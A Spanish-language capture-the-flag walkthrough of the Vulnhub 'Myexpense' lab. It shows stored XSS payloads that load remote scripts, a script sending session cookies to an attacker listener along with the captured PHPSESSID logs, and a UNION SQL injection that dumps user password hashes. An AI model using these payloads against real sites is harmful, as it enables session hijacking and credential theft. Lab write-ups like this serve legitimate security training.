---
title: Myexpense Writeup Vulnhub
published: true
---

# Historia

La máquina "Myexpense" nos pone en la situación de que somos "Samuel Lamotte" y acabamos de ser despedido de la empresa "Furtura Business Informatique". Lamentablemente, debido a su precipitada marcha, no ha tenido tiempo de validar el informe de gastos de su último viaje de negocios, que aún asciende a 750 € correspondientes a un vuelo de ida y vuelta a su último cliente.

# Enumeración

Empezamos detectando en que IP está la máquina que nos hemos descargado

```bash
fping -a -g 192.168.1.0/24 2>/dev/null
```

Y en mi caso está en la IP 192.168.1.80 

Ahora ya podemos escanear con nmap

```nmap
nmap -sCV -T4 192.168.1.80 

Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-30 16:12 CEST
Nmap scan report for 192.168.1.79
Host is up (0.00026s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Futura Business Informatique GROUPE - Conseil en ing\xC3\xA9nierie
| http-robots.txt: 1 disallowed entry 
|_/admin/admin.php

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds
```

Gracias a la enumeración de nmap podemos ver que existe /admin/admin.php

![1a](https://github.com/dtrigger289/dtrigger289.github.io/assets/109216235/289cf8a7-e11d-4310-85ed-0355ed9a7ef6)

Si le damos al boton de "Inactive" para cambiarlo a "Active" pero no podemos porque lo tiene que hacer un administrador

![2a](https://github.com/dtrigger289/dtrigger289.github.io/assets/109216235/b12c1aec-bdb0-42de-be93-615d92309251)

Probamos a iniciar sesión pero la cuenta de "slamotte" esta inactiva, asi que tendremos que crear una cuenta nueva. Dentro de la pagina para crear una cuenta nueva podemos probar a realizar un XSS. Lo que vamos a hacer es crear un XSS donde llame a la petición "192.168.1.80/admin/admin.php?id=11&status=active"

El codigo javascript que usaremos será el siguiente:

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.79/admin/admin.php?id=11&status=active');
request.send();
```

Ponemos el siguiente XSS en el lugar de "Firstname" y "Lastname"

```javascript
<script src="http://192.168.1.76/eskere.js"></script>
```

Abrimos un servidor http

```python
python3 -m http.server 80
```

Para poder mandarlo tendremos que borrar la etiqueta "disabled=""".

![3a](https://github.com/dtrigger289/dtrigger289.github.io/assets/109216235/1a098021-e152-4704-8f95-1f406bfd7530)

Después de un rato podremos ver lo siguiente

```python
python3 -m http.server 80        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.80 - - [30/Jul/2023 17:42:13] "GET /eskere.js HTTP/1.1" 200 -
```

Y podremos acceder a la cuenta de Samuel y podremos mandar la solicitud del dinero

![4a](https://github.com/dtrigger289/dtrigger289.github.io/assets/109216235/2684c305-69b5-42a5-bfcc-9efcf9d25773)

Lo mandamos y mirando la página web podemos encontrar en nuestro perfil que nuestro manager es "Manon Riviere". Para ello tendremos que modificar el script que teníamos antes pero en vez de mandar una petición, tendremos que capturar la cookie del usuario de "Manon Riviere"

(Cambiamos el puerto para que no cause problemas con el anterior script que habíamos creado)

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.79:4444/?cookie=' + document.cookie);
request.send();
```

```python
python3 -m http.server 4444

Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
192.168.1.76 - - [30/Jul/2023 21:18:12] "GET /eskere2.js HTTP/1.1" 200 -
192.168.1.76 - - [30/Jul/2023 21:18:12] "GET /eskere2.js HTTP/1.1" 200 -
192.168.1.76 - - [30/Jul/2023 21:18:12] "GET /?cookie=PHPSESSID=01mm6p8v9vrrqar6omtmf9qoc2 HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:17] "GET /eskere2.js HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:17] "GET /?cookie=PHPSESSID=f8ssrjl36iljv0d3ijkvrj4hu2 HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:22] "GET /eskere2.js HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:22] "GET /?cookie=PHPSESSID=lais5ikdk3o7s4rju48lj729l5 HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:22] "GET /?cookie=PHPSESSID=lais5ikdk3o7s4rju48lj729l5 HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:25] "GET /eskere2.js HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:25] "GET /?cookie=PHPSESSID=950elpe0sss3vrjuc9ijntt8a7 HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:25] "GET /?cookie=PHPSESSID=950elpe0sss3vrjuc9ijntt8a7 HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:26] "GET /eskere2.js HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:26] "GET /?cookie=PHPSESSID=s9ldcc3i4nh0vjlihhl87f4e81 HTTP/1.1" 200 -
192.168.1.81 - - [30/Jul/2023 21:18:26] "GET /?cookie=PHPSESSID=s9ldcc3i4nh0vjlihhl87f4e81 HTTP/1.1" 200 -
```

Probamos cada una de las cookies hasta que nos podamos cambiar de usuario ha "Manon Riviere"

![5a](https://github.com/dtrigger289/dtrigger289.github.io/assets/109216235/6cd1f6ff-dc82-427b-807e-eab0e1b66fb1)

Entramos en la pestaña "Expense reports" y permitimos el pago. Como paso final tenemos que llegar a ser "Paul Bauduoin" que es un "Financial approver". En la pestaña de "Rennes" podemos ver que si añadimos una ' en la url podemos ver que aparece el siguiente error.

![6a](https://github.com/dtrigger289/dtrigger289.github.io/assets/109216235/35d5449f-929f-42c3-a611-02a643f7cc01)

Asi que utilizando XSS otra vez pero en la url podremos sacar las contraseñas de los usuarios de la base de datos con la siguiente sintasis.

```sql
http://192.168.1.81/site.php?id=2 union select 1, group_concat(username,0x3a, password) from user-- -
```

![7a](https://github.com/dtrigger289/dtrigger289.github.io/assets/109216235/ac3c1d51-5a0a-4e3a-b048-5371fe615535)

copiamos todo el contenido en un bloc de notas y quedaría así

```
afoulon:124922b5d61dd31177ec83719ef8110a
pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a
rlefrancois:ef0dafa5f531b54bf1f09592df1cd110
mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc
mnguyen:f7111a83d50584e3f91d85c3db710708
pgervais:2ba907839d9b2d94be46aa27cec150e5
placombe:04d1634c2bfffa62386da699bb79f191
triou:6c26031f0e0859a5716a27d2902585c7
broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27
brenaud:2204079caddd265cedb20d661e35ddc9
slamotte:21989af1d818ad73741dfdbef642b28f
nthomas:a085d095e552db5d0ea9c455b4e99a30
vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3
rmasson:ebfc0985501fee33b9ff2f2734011882
deviltrigger:3f2c8111d6a0cfd65cf04dcf466014ca
```

Continuamos desencriptando la contraseña de "pbaudouin" que está en md5. Iniciamos sesión con su usuario y contraseña y finalmente podremos validar el pago. Una vez validado podemos volver a la cuenta de "slamotte" conseguiremos la flag de la máquina.

![8a](https://github.com/dtrigger289/dtrigger289.github.io/assets/109216235/6c857bb7-d313-44b7-91bb-cfe579335bf5)
